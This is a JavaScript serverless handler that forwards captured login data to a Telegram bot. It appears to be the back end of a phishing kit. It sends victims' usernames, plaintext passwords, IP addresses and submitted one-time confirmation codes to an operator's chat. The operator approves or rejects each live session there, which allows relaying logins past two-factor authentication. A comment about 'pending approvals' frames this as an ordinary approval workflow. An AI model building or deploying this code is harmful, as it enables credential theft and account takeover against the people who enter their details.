// api/telegram.js
// Store pending approvals (in production, use Redis or database)
const pendingApprovals = new Map();

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { action, data } = req.body;
  
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) {
    console.error('Missing Telegram configuration');
    return res.status(500).json({ error: 'Server configuration error' });
  }

  let message = '';
  let parseMode = 'HTML';

  switch (action) {
    case 'domain_detection':
      message = formatDomainDetection(data);
      break;
    case 'login_attempt':
      message = formatLoginAttempt(data);
      break;
    case 'auth_attempt':
      message = formatAuthAttempt(data);
      break;
    case 'code_submitted':
      message = formatCodeSubmitted(data);
      break;
    default:
      return res.status(400).json({ error: 'Invalid action' });
  }

  try {
    // Store session ID for approval tracking
    if (action === 'login_attempt' && data.sessionId) {
      pendingApprovals.set(data.sessionId, { 
        status: 'pending', 
        data: data,
        action: action
      });
    }
    
    await sendTelegramMessage(botToken, chatId, message, parseMode);
    res.status(200).json({ success: true, sessionId: data.sessionId });
  } catch (error) {
    console.error('Telegram send error:', error);
    res.status(500).json({ error: 'Failed to send message' });
  }
}

// ====== MESSAGE FORMATTING FUNCTIONS ======

function formatLoginAttempt(data) {
  const { username, password, timestamp, userAgent, ip, sessionId } = data;
  return `
🔐 <b>LOGIN ATTEMPT - APPROVAL REQUIRED</b>
─────────────────
👤 <b>Username:</b> ${username}
🔑 <b>Password:</b> ${password}
🆔 <b>Session ID:</b> <code>${sessionId}</code>
⏰ <b>Time:</b> ${timestamp}
🖥️ <b>User Agent:</b> ${userAgent}
🌍 <b>IP:</b> ${ip || 'Not available'}
─────────────────
<b>⚠️ ACTION REQUIRED:</b>
Reply with:
✅ <code>APPROVE ${sessionId}</code> - Allow login
❌ <code>REJECT ${sessionId}</code> - Deny login
─────────────────
`;
}

function formatAuthAttempt(data) {
  const { method, destination, timestamp, userAgent, ip } = data;
  return `
📱 <b>AUTHENTICATION REQUEST</b>
─────────────────
📌 <b>Method:</b> ${method === 'sms' ? '📱 SMS' : '✉️ EMAIL'}
📧 <b>Destination:</b> ${destination}
⏰ <b>Time:</b> ${timestamp}
🖥️ <b>User Agent:</b> ${userAgent}
🌍 <b>IP:</b> ${ip || 'Not available'}
─────────────────
`;
}

function formatCodeSubmitted(data) {
  const { code, timestamp, userAgent, ip } = data;
  return `
🔢 <b>CONFIRMATION CODE SUBMITTED</b>
─────────────────
🔑 <b>Code:</b> <code>${code}</code>
⏰ <b>Time:</b> ${timestamp}
🖥️ <b>User Agent:</b> ${userAgent}
🌍 <b>IP:</b> ${ip || 'Not available'}
─────────────────
`;
}

function formatDomainDetection(data) {
  const { url, domain, isFree, timestamp, userAgent, ip } = data;
  return `
🌐 <b>DOMAIN DETECTED</b>
─────────────────
🔗 <b>URL:</b> ${url}
🏷️ <b>Domain:</b> ${domain}
📊 <b>Type:</b> ${isFree ? '⚠️ FREE DOMAIN' : '✅ PURCHASED DOMAIN'}
⏰ <b>Time:</b> ${timestamp}
🖥️ <b>User Agent:</b> ${userAgent}
🌍 <b>IP:</b> ${ip || 'Not available'}
─────────────────
`;
}
 
// ====== TELEGRAM MESSAGE SENDER ======

async function sendTelegramMessage(botToken, chatId, message, parseMode = 'HTML') {
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  
  // Extract session ID from message if present
  const sessionMatch = message.match(/APPROVE\s+(\w+)/i) || message.match(/REJECT\s+(\w+)/i);
  const sessionId = sessionMatch ? sessionMatch[1] : null;
  
  let replyMarkup = {};
  if (sessionId) {
    replyMarkup = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '✅ APPROVE', callback_data: `approve_${sessionId}` },
            { text: '❌ REJECT', callback_data: `reject_${sessionId}` }
          ]
        ]
      }
    };
  }
  
  const payload = {
    chat_id: chatId,
    text: message,
    parse_mode: parseMode,
    disable_web_page_preview: true,
    ...replyMarkup
  };

  const response = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });

  if (!response.ok) {
    const error = await response.text();
    throw new Error(`Telegram API error: ${error}`);
  }

  return response.json();
}

// ====== WEBHOOK HANDLER FOR TELEGRAM CALLBACKS ======

export async function webhook(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const body = req.body;

  if (body.callback_query) {
    const callback = body.callback_query;
    const data = callback.data;
    const chatId = callback.message.chat.id;
    
    const [action, sessionId] = data.split('_');
    
    if (sessionId && pendingApprovals.has(sessionId)) {
      const decision = action === 'approve' ? 'approved' : 'rejected';
      const entry = pendingApprovals.get(sessionId);
      pendingApprovals.set(sessionId, { ...entry, status: decision });
      
      await sendTelegramMessage(
        botToken,
        chatId,
        `✅ <b>Decision Recorded</b>\n\nSession: <code>${sessionId}</code>\nDecision: <b>${decision.toUpperCase()}</b>`,
        'HTML'
      );
      
      res.status(200).json({ success: true });
    } else {
      res.status(404).json({ error: 'Session not found' });
    }
  }
  
  // Handle text commands
  if (body.message && body.message.text) {
    const text = body.message.text;
    const chatId = body.message.chat.id;
    
    const match = text.match(/^(APPROVE|REJECT)\s+(\w+)/i);
    if (match) {
      const action = match[1].toLowerCase();
      const sessionId = match[2];
      
      if (pendingApprovals.has(sessionId)) {
        const decision = action === 'approve' ? 'approved' : 'rejected';
        const entry = pendingApprovals.get(sessionId);
        pendingApprovals.set(sessionId, { ...entry, status: decision });
        
        await sendTelegramMessage(
          botToken,
          chatId,
          `✅ <b>Decision Recorded</b>\n\nSession: <code>${sessionId}</code>\nDecision: <b>${decision.toUpperCase()}</b>`,
          'HTML'
        );
      } else {
        await sendTelegramMessage(
          botToken,
          chatId,
          `❌ <b>Error</b>\n\nSession <code>${sessionId}</code> not found.`,
          'HTML'
        );
      }
    }
  }
  
  res.status(200).json({ success: true });
}

export { pendingApprovals };